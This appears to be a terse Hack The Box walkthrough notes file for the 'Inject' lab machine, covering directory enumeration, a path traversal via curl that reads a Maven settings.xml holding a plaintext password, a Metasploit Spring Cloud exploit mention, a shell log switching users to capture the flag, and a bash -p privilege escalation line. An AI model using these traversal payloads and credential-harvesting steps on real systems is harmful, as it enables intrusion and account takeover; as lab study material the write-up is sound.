#HackTheBox #linux 
# 1- Enumeration
## nmap
ports: 22,8080
## 
┌──(root㉿kali)-[/]
└─# gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://10.10.11.204:8080
/blogs                (Status: 200) [Size: 5371]
/environment          (Status: 500) [Size: 712]
/error                (Status: 500) [Size: 106]
/register             (Status: 200) [Size: 5654]
/upload               (Status: 200) [Size: 1857]

# Exploit
## LFI
┌──(root㉿kali)-[/home/kali/Desktop/HTB/inject]
└─# curl http://inject:8080/show_image?img=../../../../../../home/                    
frank
phil

┌──(root㉿kali)-[/home/kali/Desktop/HTB/inject]
└─# curl http://inject:8080/show_image?img=../../../../../../home/frank/.m2/settings.xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>



## metasploit
pom.yml => spring clood (exploit)

# Foothold
bash-5.0$ id
id
uid=1000(frank) gid=1000(frank) groups=1000(frank)
bash-5.0$ su phil
su phil                                                                                                                                                                                                           
Password: DocPhillovestoInject123                                                                                                               
bash-5.0$ id                                                                                                                                                                                                      
id                                                                                                                                                                                                                
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)                                                                                                                                                                                                                                                                                                                                                
bash-5.0$ pwd                                                                                                                                                                                                     
pwd                                                                                                                                                                                                               
/home/frank                                                                                                                                                                                                       
bash-5.0$ cd ..                                                                                                                                                                                                   
cd ..                                                                                                                                                                                                             
bash-5.0$ cd phil                                                                                                                                                                                                 
cd phil                                                                                                                                                                                                           
bash-5.0$ cat user.txt                                                                                                                                                                                            
cat user.txt                                                                                                                                                                                                      
93122b6f9fc78091a00412d3a5818420

# PrivEsc
bash-5.0$ /user/bin/bash -p